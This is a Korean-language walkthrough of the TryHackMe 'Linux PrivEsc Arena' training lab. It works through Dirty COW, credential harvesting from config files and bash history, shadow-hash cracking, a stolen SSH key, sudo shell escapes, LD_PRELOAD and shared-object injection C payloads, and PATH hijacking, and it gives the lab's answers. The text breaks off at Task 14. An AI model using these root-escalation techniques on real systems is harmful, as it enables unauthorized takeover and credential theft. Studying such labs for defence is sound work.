# Tryhackme | Linux PrivEsc Arena 챌린지

이글은 THM의 Linux PrivEsc Arena 룸에 대한 write-up 글이다
Linux PrivEsc Arena 룸은 총 19개의 Task로 이루어져 있으며  including kernel exploits, sudo attacks, SUID attacks 등 리눅스 권한 상승의 실전 연습을 목표로 구성되었다
룸에 대한 자세한 정보는 아래의 링크에서 찾아 볼 수 있다
[→ https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)
[<br>Linux PrivEsc Arena<br>Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123<br>tryhackme.com](https://tryhackme.com/room/linuxprivescarena)
### \[ Task2 - Deploy the vulnerable machine \]
※Task1은 Openvpn을 이용하여 THM의 네트워크에 연결하는 단계이므로 넘어가도록 하겠다
이번 룸에선 리눅스 권한 상승에 초점이 맞춰진 룸이다 보니 SSH 크리덴셜 확보 과정은 넘어가는 듯 하다
그러니 간단하게 주어진 자격증명(TCM:Hacker123)으로 SSH에 접속만 해주면 된다
**명령어:**
```bash
ssh -p 22 TCM@<IP>
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/1.png)
만약 표준 연결 명령어를 사용하였을 때 SSH 클라이언트와 서버간의 버전 차이 때문에 연결이 안될수도 있다
※최신 OpenSSH 클라이언트는 보안상 취약한 ssh-rsa 알고리즘을 기본적으로 비활성화하기 때문에 구버전 서버와의 호스트키 알고리즘 협상이 실패하는 현상이 일어남
그럴경우 아래와 같이 HostKey Algorithms 옵션을 사용하여 레거시(구형) 알고리즘인 ssh-rsa를 허용하도록 강제한다
**명령어:**
```bash
ssh -o "HostKeyAlgorithms=+ssh-rsa" TCM@<IP>
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/2.png)
명령어를 사용하면 사진과 같이 ssh 접속이 성공한 것을 확인 할 수 있다
### \[ Task3 - Privilege Escalation - Kernel Exploits \]
앞서 Task2에서 획득한 ssh 셸로 미리 설치된 linux-exploit-suggester.sh를 실행하면 현재 시스템의 커널 버전을 분석하여 사용 가능한 익스플로잇 목록을 확인할 수 있다
※실전 상황에선 익스플로잇 도구가 타겟 머신에 존재하지 않으므로 wget,scp 또는 python으로 웹 서버 등을 이용해 직접 업로드 해야 한다
**명령어:**
```bash
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/3.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/4.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/5.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/7.png)
출력 결과 다수의 익스플로잇이 발견되었으며 이 중 \[CVE-2016-5195\] dirtycow 를 이용해 권한 상승을 진행하겠다
※목록에서 Dirtycow를 선택한 이유는 현재 시스템(debian)이 취약 범위에 포함되며 신뢰성이 높고 검증된 익스플로잇이기 때문이다
Dirtycow 취약점을 이용하기 위해선 /usr/bin/passwd 바이너리를 root 쉘로 바꿔치기 해서 일반 유저가 root권한을 얻을 수 있도록 만들어주면 된다
※Dirtycow는 Race Condition 취약점이다
**Dirtycow 취약점 원리:**
```bash
Race Condition:
두 개의 스레드가 동시에 같은 자원에 접근할 때 타이밍 차이로 인해 의도치 않은 결과가 나오는 것

DirtyCow 원리:
리눅스 커널(데비안 포함)에는 Copy-on-Write(CoW)라는 메커니즘이 있다

패치 전 CoW 원리:
1.읽기 전용 파일을 수정하려 하면 커널이 복사본을 만들어서 수정하게 함
2.원본은 건드리지 못하도록 보호

Dirtycow 취약점 원리:
1.스레드1: 복사본 만드는 중
2.스레드2: 그 찰나의 순간에 원본에 접근
3.타이밍이 맞으면 읽기 전용인 원본 파일을 수정 가능

이걸 이용해서 root 소유의 /usr/bin/passwd를 일반 유저가 덮어쓸 수 있게 된다
```
**명령어:**
```bash
(1 - 익스플로잇 코드 컴파일 + 명령어 기능)

gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
#1.c0w.c 소스코드는 그냥 텍스트 파일이라 실행이 불가능하기 때문에 gcc로 컴파일해준다
#2.-pthread 옵션은 Dirtycow가 Race Condition 기반 취약점이기 때문에 멀티스레드를 사용할 수 있도록 해준다

(2 - 익스플로잇 실행 + 명령어 기능)

./c0w
#1.Dirtycow 취약점을 이용해 /usr/bin/passwd 바이너리를 root 셸로 교체한다

(3 - root 권한 획득 + 명령어 기능)

passwd
#1./usr/bin/passwd가 root 셸로 교체된 상태이므로 실행하면 root 셸이 실행된다

(4 - 권한 확인 + 명령어 기능)

id
#1.uid=0(root)가 출력되면 권한 상승 성공이다

(5 - 복구 + 명령어 기능)

cp /tmp/bak /usr/bin/passwd
#1.2단계에서 백업해둔 원본 passwd를 되돌려놓아 머신을 원래 상태로 복구
#2.작업 중 실행하면 root 권한을 잃기 때문에 작업 완료 후 실행해야한다
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/8.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/9.png)
실행 결과 root 권한을 획득할 수 있었다
### \[ Task4 - Privilege Escalation - Stored Passwords (Config Files)\]
root 권한을 획득하였으니 이번 Task에서는 크리덴셜을 수집하는 것이 목표이다
크리덴셜은 흔히 VPN설정파일이나 IRC/채팅 설정 파일, SSH 키 등등 수백 수천개의 다양한 파일들에 저장되어 있을 수 있다
이와 같은 이유로 실전에선 자동화 도구를 사용하지만 이 랩에서는 크리덴셜이 저장된 파일 경로를 사전에 지정해주었기 때문에 해당 파일들을 열어 크리덴셜을 수집한다
**수집 대상 파일:**
```bash
/home/user/myvpn.ovpn      →   VPN 설정파일로 auth-user-pass 항목이 인증 파일 경로를 찾을 수 있다
/etc/openvpn/auth.txt	   →   VPN 인증 파일로 평문으로 아이디/비밀번호가 저장되어 있다
/home/user/.irssi/config   →    IRC 클라이언트 설정 파일로 평문 비밀번호가 저장되어 있다
```
**명령어:**
```bash
cat /home/user/myvpn.ovpn
#VPN 설정파일
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/10.png)
**명령어:**
```bash
cat /etc/openvpn/auth.txt
#auth-user-pass - 인증 파일 경로
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/11.png)
**명령어:**
```bash
cat /home/user/.irssi/config | grep -i passw
#IRC 클라이언트 설정 파일
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/12.png)
실행 결과 VPN 과 IRC 서버의 크리덴셜(user:password321) 을 얻을 수 있었다
**정답:**
```bash
1.What password did you find?
#password321

2.What user's credentials were exposed in the OpenVPN auth file?
#user
```
### \[ Task5 - Privilege Escalation - Stored Passwords (History)\]
Task5에선 이전 Task와는 다르게 bash 히스토리에서 크리덴셜을 찾아보도록 하겠다
※ bash history = 터미널에서 입력한 명령어들이 전부 자동으로 저장되는 파일
**명령어:**
```bash
cat /home/user/.bash_history | grep -i passw
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/13.png)
실행 결과 mysql 서버의 크리덴셜을 얻을 수 있었다
※mysql 로그인 명령어에 -p 옵션으로 비밀번호를 직접 입력하면 히스토리에 남을 수 있다
※ 바른 방법은 -p 옵션만 입력 후 프롬프트에서 별도 입력하는 것으로 이 경우 히스토리에 비밀번호가 남지 않는다
**정답:**
```bash
1.What was TCM trying to log into?
#mysql

2.Who was TCM trying to log in as?
#root

3.Naughty naughty.  What was the password discovered?
#password123
```
### \[ Task6 - Privilege Escalation - Weak File Permissions\]
※/etc/shadow 파일의 권한이 -rw-rw-r--로 잘못 설정되어 있어 일반 유저도 읽을 수 있는 상태이다
※ 정상적인 권한은 -rw-r----- (640)으로 root와 shadow 그룹만 읽을 수 있어야 한다
Task6은 etc/shadow 파일에서 비밀번호 획득한 뒤 크래킹하여 평문 비밀번호를 획득 하는 것이 목표이다
또한 크래킹을 하기 위해선 /etc/passwd와 /etc/shadow를 unshadow 툴로 합쳐야 hashcat이 크래킹할 수 있는 형태가 된다
**명령어:**
```bash
(debian 터미널)

ls -la /etc/shadow
# 파일 권한 확인

cat /etc/passwd
# 유저 목록 복사 후 Kali에서 nano passwd.txt 에 붙여넣기

cat /etc/shadow
# 비밀번호 해시 복사 후 Kali에서 nano shadow.txt 에 붙여넣기

----------------------------------------------

(Kali 터미널)

nano passwd.txt
# passwd 내용 붙여넣기 후 Ctrl+X → Y → Enter

nano shadow.txt
# shadow 내용 붙여넣기 후 Ctrl+X → Y → Enter

unshadow passwd.txt shadow.txt > unshadowed.txt
# 두 파일 합치기

hashcat -m 1800 unshadowed.txt rockyou.txt -O
# 해시 크래킹
```
**명령어**:
```bash
ls -la /etc/shadow
# 파일 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/14.png)
**명령어:**
```bash
cat /etc/passwd
# 유저 목록 복사 후 Kali에서 nano passwd.txt 에 붙여넣기
```
**결과**:
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/15.png)
**명령어**:
```bash
cat /etc/shadow
# 비밀번호 해시 복사 후 Kali에서 nano shadow.txt 에 붙여넣기
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/16.png)
**명령어:**
```bash
hashcat -m 1800 unshadowed.txt rockyou.txt -O
# 해시 크래킹
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/17.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/18.png)
파일 권한 확인을 통해 /etc/shadow 파일이 -rw-rw-r-- 로 설정되어 일반 유저도 읽을 수 있는 상태인 것을 알 수 있었다
이를 이용해 비밀번호 해시를 획득한 뒤 hashcat으로 크래킹하여 root 계정의 평문 비밀번호 password123을 얻을 수 있었다
**정답:**
```bash
1.What were the file permissions on the /etc/shadow file?
#-rw-rw-r--
```
### \[ Task7 - Privilege Escalation - SSH Keys\]
Task7 에선 SSH 개인키 파일을 찾아서 root로 로그인 하는것이 목표다
기존 개인키(id_rsa)는 사용자만 읽을 수 있어야 하지만 권한 설정이 잘못 되어 있는 경우 다른 사용자도 해당 키를 읽어 SSH 로그인에 악용할 수 있다
**명령어:**
```bash
find / -name authorized_keys 2> /dev/null
#시스템 전체에서 authorized_keys 파일을 찾는 명령어
#authorized_keys = 서버에 저장된 공개 키 파일
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/19.png)
authorized_keys 파일을 찾는 명령어로 root 계정이 SSH 키 인증을 사용한다는 것을 확인했다
SSH 키 인증을 사용한다는 것을 확인했으니 find 명령어로 id_rsa 파일을 찾아 경로를 확인해준다
**명령어:**
```bash
find / -name id_rsa 2> /dev/null
#시스템 전체에서 id_rsa 파일을 찾는 명령어
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/20.png)
탐색 결과 /backups/supersecretkeys/id_rsa 에서 개인키가 발견되었다
해당 개인키를 공격자 머신으로 복사한 뒤 root 계정에 SSH 로그인을 시도해준다
**명령어:**
```bash
cat /backups/supersecretkeys/id_rsa
#id_rsa 읽기

nano id_rsa
#붙여넣기 후 Ctrl+X → Y → Enter
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/21.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/22.png)
SSH 개인키를 공격자 머신으로 복사했다
SSH는 개인키 권한이 너무 열려있으면 보안상 이유로 접속을 거부하기 때문에 chmod 400으로 권한을 설정해야 한다
이후 ssh -i 옵션으로 비밀번호 없이 개인키로 root 계정에 로그인한다
**명령어:**
```bash
chmod 400 id_rsa
#소유자만 읽기 권한으로 권한을 좁혀 접속 거부 방지

ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa root@<IP>
#구버전 SSH 키 타입 허용 + 구버전 공개 키 알고리즘 허용
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/23.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/24.png)
실행 결과 비밀번호 없이 개인키로만 root 계정 로그인에 성공 했다
**정답:**
```bash
1.What's the full file path of the sensitive file you discovered?
#/backups/supersecretkeys/id_rsa
```
### \[ Task8 - Privilege Escalation - Sudo (Shell Escaping)\]
Task8에선 권한이 잘못 설정된 sudo 명령어를 이용하여 root 셸을 획득하는 것이 목표다
**명령어:**
```bash
sudo -l
# sudo로 실행 가능한 명령어 목록 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/25.png)
명령어 실행 결과 sudo 실행이 가능한 목록들을 확인 할 수 있다
iftop부터 more까지 sudo 권한 상승 취약점에 악용 가능한 목록이지만 이번 Task에선 이 중 find, awk, vim, nmap 명령어를 이용해 셸을 실행하는 방법을 사용한다
**명령어(find):**
```bash
sudo find /bin -name nano -exec /bin/sh \;
# find의 -exec 옵션으로 root 셸 실행
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/26.png)
※root 셸 획득 성공
**명령어(awk):**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
# awk의 system() 함수로 root 셸 실행
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/27.png)
※root 셸 획득 성공
**명령어(vim):**
```bash
sudo vim -c '!sh'
# vim 내부 명령어로 root 셸 실행
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/28.png)
※root 셸 획득 성공
**명령어(nmap):**
```bash
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
# nmap 스크립트 기능으로 root 셸 실행
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/29.png)
※root 셸 획득 성공
### \[ Task9 - Privilege Escalation - Sudo (Abusing Intended Functionality)\]
이번 Task에서는 이전 Task에서 확인한 sudo 목록 중 apache2를 이용한다
apache2의 -f 옵션으로 /etc/shadow 파일을 읽어 root 비밀번호 해시를 획득한 뒤 john으로 크래킹하는 것이 목표이다
※ apache2가 shadow 파일을 설정 파일로 잘못 읽으면서 내용을 에러 메시지로 출력하는 것을 악용하는 것
**명령어:**
```bash
sudo apache2 -f /etc/shadow
# apache2가 shadow 파일을 읽다가 에러와 함께 root 해시 출력
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/30.png)
명령어 실행 결과 에러 메시지 안에 root 해시가 포함되었다
다음으로 해시 파일을 저장하고 크랙해주면 root 크리덴셜을 얻을 수 있다
**명령어:**
```bash
echo '해쉬' > hash.txt
# 해시 파일 저장

john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
# 해시 크래킹
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/31.png)
크래킹 결과 root 계정의 비밀번호가 password123 임을 확인할 수 있었다
### \[ Task10 - Privilege Escalation - Sudo (LD_PRELOAD)\]
Task10에선 LD_PRELOAD 환경변수를 이용한 root 셸 획득이 목표이다
Task8에서 sudo -l 실행 시 출력된 env_keep+=LD_PRELOAD 설정으로 인해 sudo 실행 시에도 LD_PRELOAD가 초기화되지 않고 유지되는데 이를 악용하여 악성 라이브러리를 root 권한으로 먼저 실행시킨다
※ LD_PRELOAD = 프로그램 실행 전 특정 라이브러리를 먼저 로드하는 환경변수
**x.c 파일 작성(악성 파일):**
```bash
nano x.c
#파일 생성

(악성 코드)
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
**컴파일 및 실행:**
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
# x.c를 공유 라이브러리(.so)로 컴파일
# -fPIC = 위치 독립적 코드 생성 (공유 라이브러리에 필수)
# -shared = 공유 라이브러리로 컴파일
# -nostartfiles = 표준 시작 파일 제외 (라이브러리이므로 main 함수 불필요)

sudo LD_PRELOAD=/tmp/x.so apache2
# LD_PRELOAD에 악성 라이브러리 지정 후 sudo로 apache2 실행
# apache2 실행 전 x.so가 먼저 로드되어 root 셸 실행

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/32.png)
실행결과 root 셸 획득에 성공하였다
### \[ Task11 - Privilege Escalation - SUID (Shared Object Injection)
Task11에선 SUID 바이너리의 취약점을 이용한 root 쉘 획득이 목표이다
SUID가 설정된 바이너리가 실행 시 특정 라이브러리를 로드하는데 해당 라이브러리가 존재하지 않을 경우 그 자리에 악성 라이브러리를 넣으면 SUID 권한(root)으로 악성 라이브러리가 실행되어 root 셸을 획득할 수 있다
※ SUID(Set User ID) = 파일 실행 시 파일 소유자의 권한으로 실행되는 특수 권한
**명령어:**
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# SUID 바이너리 목록 전체 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/33.png)
명령어 실행 결과 SUID 바이너리 목록들이 출력 됐다
다음으로 SUID 바이너리 목록을 확인한 뒤 strace로 suid-so 바이너리가 실행 시 어떤 라이브러리를 로드하려는지 추적해준다
※실전일 경우 SUID 바이너리 목록 전체를 확인해야 하지만 이 랩에서는 비교를 위해 정상적으로 매칭된 /usr/bin/sudo와 취약한 suid-so 두 개만 분석한다
**명령어:**
```bash
strace <SUID 경로> 2>&1 | grep -i -E "open|access|no such file"
# SUID 바이너리가 실행 시 로드하려는 라이브러리 확인
# open("경로") = 3            → 파일 정상적으로 찾음
# open("경로") = -1 ENOENT    → 실제로 로드하려는 라이브러리가 없음(취약점)
# access("경로") = -1 ENOENT  → 선택적 확인 파일이라 무시해도 됨

ls -la <없는 라이브러리의 상위 디렉토리>
# 해당 경로가 쓰기 가능한지 확인
# drwxrwxrwx or 소유자가 현재 유저 → 쓰기 가능
# drwxr-xr-x 	 → 소유자만 쓰기 가능
```
**결과(정상 바이너리):**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/34.png)
**결과(비정상 바이너리):**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/35.png)
strace 결과에서 open으로 시작하면서 ENOENT가 출력된 항목이 실제로 로드하려는 라이브러리가 없는 것을 의미한다
또한 해당 디렉토리가 쓰기 가능하기 때문에 해당 경로에 악성 라이브러리를 넣으면 suid-so 실행 시 악성 라이브러리가 로드되어 root 셸을 획득할 수 있다
**명령어:**
```bash
mkdir /home/user/.config
# strace에서 발견한 경로에 맞게 디렉토리 생성

cd /home/user/.config
# 생성한 디렉토리로 이동

nano libcalc.c
# 악성 라이브러리 코드 작성

(악성코드)
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
#bash를 /tmp/bash로 복사 후 SUID 설정 → root 셸 실행

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
# 악성 라이브러리 컴파일

/usr/local/bin/suid-so
# suid-so 실행 시 악성 라이브러리 로드

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/36.png)
실행 결과 루트 셸을 획득하였다
### \[ Task12 - Privilege Escalation - SUID (symlinks)\]
Task12에선 nginx 구버전의 logrotate 취약점을 이용해 root 권한을 얻는 것이 목표이다
logrotate는 로그 파일이 너무 커지면 자동으로 압축/교체해주는 프로그램으로 nginx 1.6.2-5+deb8u3 미만 버전일 경우 심볼릭 링크 공격이 가능해져 www-data 권한으로 root 권한획득이 가능하다
※ Log Rotation 공격은 동일한 서버에 두 개의 셸 세션이 필요하다
**명령어(터미널1 - SSH 세션):**
```bash
dpkg -l | grep nginx
# nginx 버전 확인 (1.6.2-5+deb8u3 미만이면 취약)

su root
# 비밀번호: password123
# 실전에서는 웹서버 취약점으로 www-data 권한을 얻어야 하지만
# 이 랩에서는 시뮬레이션을 위해 root를 거쳐 www-data로 전환

su -l www-data
# www-data로 전환 (nginx 로그 파일 조작 권한 필요)

/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
# exploit 실행 후 logrotate 대기
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/37.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/38.png)
uid = 실제 로그인한 유저, euid = 현재 실행 권한
**명령어(터미널2 - SSH 세션):**
```bash
su root
# root로 전환 (비밀번호: password123)

invoke-rc.d nginx rotate >/dev/null 2>&1
# logrotate 강제 실행 → 터미널 1 exploit 트리거
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/39.png)
실행결과 euid가 0으로 root 권한 획득에 성공하였다
**정답:**
```bash
1.What CVE is being exploited in this task?
#CVE-2016-1247

2.What binary is SUID enabled and assists in the attack?
#sudo
```
### \[ Task13 - Privilege Escalation - SUID (Enviroment Variables #1)\]
Task13에선 SUID 바이너리가 절대경로 없이 명령어를 실행할 때 PATH 환경변수를 조작해서 root 권한을 획득하는 것이 목표이다
기존 suid-env 바이너리는 내부적으로 service 명령어를 절대경로 없이 호출한다
리눅스는 명령어를 실행할 때 PATH 환경변수에 등록된 디렉토리를 순서대로 탐색하는데 절대경로 없이 호출하면 PATH에서 먼저 발견되는 파일을 실행한다
따라서 PATH에 /tmp를 가장 앞에 추가하고 /tmp/service에 root 쉘을 실행하는 악성 파일을 넣으면 suid-env 실행 시 악성 service가 SUID 권한(root)으로 실행되어 root 셸을 획득할 수 있다
**명령어:**
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# SUID 바이너리 목록 확인

strings /usr/local/bin/suid-env
# suid-env 내부에서 어떤 명령어를 호출하는지 확인
# 절대경로 없이 호출하는 명령어 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/40.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/41.png)
두번째 사진의 명령어 출력 결과 절대 경로 없이 service를 호출하고 있다
이는 PATH 환경변수를 조작하여 악성 service 파일을 먼저 실행시킬 수 있다는 것을 의미한다
따라서 /tmp에 root 셸을 실행하는 악성 servce파일을 만들고 PATH앞에 /tmp를 추가하여 suid-env 실행 시 악성 service가 root 권한으로 실행되도록 한다
**명령어:**
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
# /tmp에 악성 service 코드 작성

gcc /tmp/service.c -o /tmp/service
# 악성 service 컴파일

export PATH=/tmp:$PATH
# PATH 앞에 /tmp 추가 → service 탐색 시 /tmp 먼저 탐색

/usr/local/bin/suid-env
# suid-env 실행 → /tmp/service 로드 → root 셸 획득

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/42.png)
실행 결과 완전한 루트 권한을 획득하였다
※euid = 0 은 실행 권한만, uid = 0 은 완전한 root 권한
**정답:**
```bash
1.What is the last line of the strings /usr/local/bin/suid-env output?
#service apache2 start
```
### \[ Task14 - Privilege Escalation - SUID (Enviroment Variables #2) \]
Task14에선 Task13과 달리 suid-env2가 service를 절대경로(/usr/sbin/service)로 호출하기 때문에 PATH 조작이 불가능하다
따라서 두 가지 다른 방법으로 root 셸을 획득한다
**명령어:**
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# SUID 바이너리 목록 확인

